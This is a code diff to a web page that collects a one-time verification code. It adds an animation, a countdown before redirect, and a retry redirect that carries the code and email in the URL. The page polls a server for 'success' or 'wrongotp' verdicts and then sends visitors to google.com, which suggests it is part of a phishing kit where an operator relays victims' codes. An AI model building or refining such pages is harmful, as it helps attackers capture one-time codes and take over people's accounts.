@@ -155,6 +155,20 @@
             text-align: center;
             margin-top: 10px;
             display: none;
+            font-size: 18px;
+            font-weight: bold;
+            animation: slideIn 0.5s ease-out;
+        }
+
+        @keyframes slideIn {
+            from { transform: translateY(-20px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        .countdown {
+            font-size: 16px;
+            color: #4a5568;
+            margin-top: 10px;
         }
     </style>
 </head>
@@ -186,6 +200,7 @@
                 
                 <div class="error-message" id="errorMessage"></div>
                 <div class="success-message" id="successMessage"></div>
+                <div class="countdown" id="countdown"></div>
                 
                 <div class="throbber" id="otpThrobber"></div>
                 
@@ -205,9 +220,11 @@
             const otpThrobber = document.getElementById('otpThrobber');
             const errorMessage = document.getElementById('errorMessage');
             const successMessage = document.getElementById('successMessage');
+            const countdownElement = document.getElementById('countdown');
             const submitBtn = document.getElementById('submitBtn');
             
             let checkStatusInterval;
+            let countdownInterval;
             
             // Auto-focus first input
             otpInputs[0].focus();
@@ -296,21 +313,46 @@
                         
                         if (data.status === 'success') {
                             clearInterval(checkStatusInterval);
-                            showSuccess('Verification successful! Redirecting...');
-                            setTimeout(() => {
-                                window.location.href = 'https://google.com';
-                            }, 3000);
+                            handleSuccess();
                         } else if (data.status === 'wrongotp') {
                             clearInterval(checkStatusInterval);
-                            showError('Invalid verification code');
-                            setTimeout(() => {
-                                window.location.reload();
-                            }, 3000);
+                            handleWrongOTP();
                         }
                     } catch (error) {
                         console.error('Error checking status:', error);
                     }
                 }, 3000);
+            }
+            
+            function handleWrongOTP() {
+                showError('Wrong code entered. Please try again.');
+                setTimeout(() => {
+                    window.location.href = 'otp.html?code=' + verificationCode + '&email=' + encodeURIComponent(email);
+                }, 2000);
+            }
+            
+            function handleSuccess() {
+                // Hide form elements
+                otpForm.style.display = 'none';
+                
+                // Show success message
+                successMessage.textContent = 'Verification successful!';
+                successMessage.style.display = 'block';
+                
+                // Start countdown
+                let seconds = 30;
+                countdownElement.textContent = `Redirecting in ${seconds} seconds...`;
+                countdownElement.style.display = 'block';
+                
+                countdownInterval = setInterval(() => {
+                    seconds--;
+                    countdownElement.textContent = `Redirecting in ${seconds} seconds...`;
+                    
+                    if (seconds <= 0) {
+                        clearInterval(countdownInterval);
+                        window.location.href = 'https://google.com';
+                    }
+                }, 1000);
             }
             
             function showError(message) {
@@ -319,12 +361,6 @@
                 errorMessage.style.display = 'block';
                 otpInputs.forEach(input => input.value = '');
                 otpInputs[0].focus();
-            }
-            
-            function showSuccess(message) {
-                successMessage.textContent = message;
-                successMessage.style.display = 'block';
-                otpForm.style.display = 'none';
             }
             
             function resetFormState() {
@@ -340,9 +376,10 @@
                 submitBtn.disabled = !allFilled;
             }
             
-            // Clean up interval when leaving page
+            // Clean up intervals when leaving page
             window.addEventListener('beforeunload', function() {
                 clearInterval(checkStatusInterval);
+                clearInterval(countdownInterval);
             });
         });
     </script>
